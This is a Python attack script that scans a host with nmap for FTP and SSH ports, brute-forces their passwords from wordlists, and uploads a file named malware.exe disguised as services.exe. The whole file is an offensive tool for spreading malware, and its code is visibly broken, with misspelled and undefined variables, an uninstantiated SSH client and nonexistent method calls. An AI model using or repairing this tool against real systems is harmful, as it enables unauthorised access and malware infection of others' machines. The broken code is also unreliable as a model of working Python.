import nmap
import paramiko
from threading import Thread
import ftplib

target = "127.0.0.1"

def sftp_target(target,username,passwd):
    try:
        transport = paramiko.Transport((target,22))
        transport.connect(username=username,password=paaswd)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put("malware.exe","services.exe")
        print("[*]Malware uploaded to %s through SFTP"%(target))
        sftp.close()
        transport.close()
    except Exception as e:
        print("[*]Error : %s"%(str(e)))

def upload_malware_ftp(target,username,passwd):
    try:
        file = open("malware.exe",'rb')
        data = file.read()
        file.close()
        print("[*]Uploading malware on %s..."%(target))
        ftp = ftplib.FTP(target)
        ftp.login(username,passwd)
        resp = ftp.storlines("STOR services.exe",data)
        if 'complete' in resp or "COMPLETE" in resp:
            print("[*]Malware uploaded successfully on %s"%(target))
        else:
            print("[*]Failed to upload malware on %s : %s"%(target,str(resp)))
    except Exception as e:
        print("[*]Error : %s"%(str(e)))

def brute_ftp(target):
    file = open('ftp.txt','r')
    for passwd in file.readlines():
        try:
            ftp = ftplib.FTP(target)
            ftp.login(username,paswd)
            print("[*] FTP Bruteforce successful on %s"%(target))
            print("[*] Password : %s"%(passwd))
            upload_malware_ftp(target,username,passwd)
            break
        except Exception as e:
            print("[*] Error : %s"%(str(e)))
            break
    file.close()
    return

def upload_malware_ssh(target,username,passwd):
    try:
        ssh = paramiko.SSHClient
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.login(target,username=username,password=passwd)
        input,output,error = ssh.exec_command('ls')
        print("[*]Files for %s : ")
        print(str(output.readlines()))
    except Exception as e:
        print("[*]Error : %s"%(str(e)))

def ssh_brute(target):
    file = open("ssh.txt",'r')
    for passwd in file.readlines():
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target,username=user_name,pasword=passwd)
            print("[*]SSH Bruteforce successful on %s"%(target))
            print("[*] Password : %s"%(passwd))
            upload_malware_ssh(target,user_name,passwd)
        except AuthenticationException:
            pass
        except Exception as e:
            print("[*] Error : %s"%(str(e)))
            break
    file.close()
    return

def scan_target(target,ports):
    nm = nmap.PortScanner()
    nm.scan(target,ports)
    for host in nm.all_hosts():
        if nm[host].has_tcp(22):
            print("[*]SSH Open on %s"%(host))
            print("[*]Starting SSH Bruteforce on %s"%(host))
            bruter = Thread(target=ssh_brute,args=(target,))
            bruter.start()
        if nm[host].has_tcp(21):
            print("[*]FTP Open on %s"%(host))
            print("[*]Starting FTP bruteforce on %s"%(target))
            brute_ftp(target)

def main():
    global target
    scan_target(target,'21-22')

if __name__ == '__main__':
    main()
